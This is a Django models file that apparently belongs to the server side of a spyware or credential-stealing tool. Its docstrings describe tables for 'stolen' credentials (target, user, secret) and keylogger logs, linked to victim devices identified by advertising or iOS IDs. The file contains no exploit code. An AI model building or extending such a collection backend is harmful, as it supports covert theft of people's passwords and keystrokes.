'''Model objects for interacting with the database.'''

from django.db import models, IntegrityError


class ApplicationModel(models.Model):
    '''Abstract base to add timestamps to other models.'''

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        abstract = True


class Device(ApplicationModel):
    '''A specific device, aggregation point for other information.'''

    token = models.CharField(max_length=100)

    class Meta:
        indexes = [
            models.Index(fields=['token']),
        ]
        unique_together = ['token']

    def create_device_ids(self, ids):
        '''
        Create device ids for this device in a way that run their validations.

        :param ids: Array of hash suitable to construct a DeviceId from
        '''
        for new_id in ids:
            self.device_ids.create(**new_id)


class DeviceId(ApplicationModel):
    '''Identifies for a device each has a type and a value.'''

    IdType = models.TextChoices('IdType', 'GOOGLE_AD_ID IOS_ID')
    id_type = models.CharField(choices=IdType.choices, max_length=100)
    value = models.CharField(max_length=100)
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='device_ids')

    class Meta:
        indexes = [
            models.Index(fields=['id_type', 'value']),
        ]
        unique_together = [['id_type', 'value']]

    @staticmethod
    def validate_ids(sender, instance, **kwargs):
        '''Additional validation, primarily that the type is one of the valid
        choices.'''
        # no idea what the point of empty=False is if it doesn't catch this...
        if not instance.value:
            raise IntegrityError('DeviceId value may not be empty')
        # seem like I shouldn't have to do this myself either...
        if instance.id_type not in sender.IdType:
            raise IntegrityError(
                'DeviceId type "{}" is not one of the permitted values: {}'.format(
                    instance.id_type,
                    ', '.join(sender.IdType)))

# I'd prefer a DB constraint, but this will have to do for now
models.signals.pre_save.connect(DeviceId.validate_ids, sender=DeviceId)


class Credential(ApplicationModel):
    '''A stolen credential with information about where it came from.'''

    target = models.CharField(max_length=100)
    user = models.CharField(max_length=100)
    secret = models.CharField(max_length=100, blank=True)
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='credentials')

    class Meta:
        indexes = [
            models.Index(fields=['target', 'user', 'device_id']),
        ]
        unique_together = [['target', 'user', 'device_id']]


class Log(ApplicationModel):
    '''A stolen log like from a keylogger.'''

    text = models.TextField()
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='logs')
